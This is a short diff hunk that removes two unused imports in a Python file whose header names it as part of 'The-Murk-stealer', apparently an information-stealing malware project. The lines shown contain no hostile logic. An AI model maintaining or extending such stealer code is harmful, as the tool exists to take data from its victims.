@@ -10,7 +10,7 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from os import sep,environ,makedirs,getenv,path,listdir,walk
+from os import sep,environ,makedirs,path,listdir
 from shutil import copy2,copytree
 from re import findall
 from manager.logger import Log
